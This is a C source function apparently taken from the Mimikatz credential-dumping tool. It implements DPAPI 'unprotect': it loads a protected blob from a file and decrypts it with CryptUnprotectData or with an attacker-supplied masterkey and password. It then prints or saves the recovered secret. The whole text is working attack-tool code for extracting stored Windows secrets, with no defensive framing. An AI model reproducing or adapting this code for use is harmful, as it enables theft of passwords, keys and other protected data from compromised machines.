NTSTATUS kuhl_m_dpapi_unprotect(int argc, wchar_t * argv[])
{
	DATA_BLOB dataIn, dataOut, dataEntropy = {0, NULL};
	PKULL_M_DPAPI_BLOB blob;
	PCWSTR szEntropy, outfile, infile, szMasterkey, szPassword = NULL;
	PWSTR description = NULL;
	CRYPTPROTECT_PROMPTSTRUCT promptStructure = {sizeof(CRYPTPROTECT_PROMPTSTRUCT), CRYPTPROTECT_PROMPT_ON_PROTECT | CRYPTPROTECT_PROMPT_ON_UNPROTECT | CRYPTPROTECT_PROMPT_STRONG, NULL, MIMIKATZ}, *pPrompt;
	DWORD flags = 0;
	UNICODE_STRING uString;

	BOOL statusDecrypt = FALSE;
	PBYTE masterkey = NULL;
	DWORD masterkeyLen = 0;

	if(kull_m_string_args_byName(argc, argv, L"entropy", &szEntropy, NULL))
		kull_m_string_stringToHexBuffer(szEntropy, &dataEntropy.pbData, &dataEntropy.cbData);
	if(kull_m_string_args_byName(argc, argv, L"machine", NULL, NULL))
		flags |= CRYPTPROTECT_LOCAL_MACHINE;
	pPrompt = kull_m_string_args_byName(argc, argv, L"prompt", NULL, NULL) ? &promptStructure : NULL;
	if(kull_m_string_args_byName(argc, argv, L"masterkey", &szMasterkey, NULL))
		kull_m_string_stringToHexBuffer(szMasterkey, &masterkey, &masterkeyLen);
	kull_m_string_args_byName(argc, argv, L"password", &szPassword, NULL);

	kprintf(L"\nflags       : "); kull_m_dpapi_displayProtectionFlags(flags); kprintf(L"\n");
	kprintf(L"prompt flags: "); if(pPrompt) kull_m_dpapi_displayPromptFlags(pPrompt->dwPromptFlags); kprintf(L"\n");
	kprintf(L"entropy     : "); kull_m_string_wprintf_hex(dataEntropy.pbData, dataEntropy.cbData, 0); kprintf(L"\n");
	kprintf(L"masterkey   : "); kull_m_string_wprintf_hex(masterkey, masterkeyLen, 0); kprintf(L"\n");
	kprintf(L"password    : %s\n\n", szPassword ? szPassword : L"");

	if(kull_m_string_args_byName(argc, argv, L"in", &infile, NULL))
	{
		if(kull_m_file_readData(infile, &dataIn.pbData, &dataIn.cbData))
		{
			if(blob = kull_m_dpapi_blob_create(dataIn.pbData))
			{
				kull_m_dpapi_blob_descr(blob);

				if(masterkey && masterkeyLen)
					statusDecrypt = kull_m_dpapi_unprotect_blob(blob, masterkey, masterkeyLen, dataEntropy.pbData, dataEntropy.cbData, szPassword, (LPVOID *) &dataOut.pbData, &dataOut.cbData);
				else
					statusDecrypt = CryptUnprotectData(&dataIn, &description, &dataEntropy, NULL, pPrompt, 0, &dataOut);

				if(statusDecrypt)
				{
					if(description)
					{
						kprintf(L"description : %s\n", description);
						LocalFree(description);
					}

					if(kull_m_string_args_byName(argc, argv, L"out", &outfile, NULL))
					{
						if(kull_m_file_writeData(outfile, dataOut.pbData, dataOut.cbData))
							kprintf(L"Write to file \'%s\' is OK\n", outfile);
					}
					else
					{
						uString.Length = uString.MaximumLength = (USHORT) dataOut.cbData;
						uString.Buffer = (PWSTR) dataOut.pbData;
						kprintf(L"data - ");
						if((uString.Length <= USHRT_MAX) && (kull_m_string_suspectUnicodeString(&uString)))
							kprintf(L"text : %s", dataOut.pbData);
						else
						{
							kprintf(L"hex  : ");
							kull_m_string_wprintf_hex(dataOut.pbData, dataOut.cbData, 1 | (16 << 16));
						}
						kprintf(L"\n");
					}
					LocalFree(dataOut.pbData);
				}
				else if(!masterkey) PRINT_ERROR_AUTO(L"CryptUnprotectData");

				kull_m_dpapi_blob_delete(blob);
			}
			LocalFree(dataIn.pbData);
		}
	}

	if(dataEntropy.pbData)
		LocalFree(dataEntropy.pbData);

	if(masterkey)
		LocalFree(masterkey);

	return STATUS_SUCCESS;
}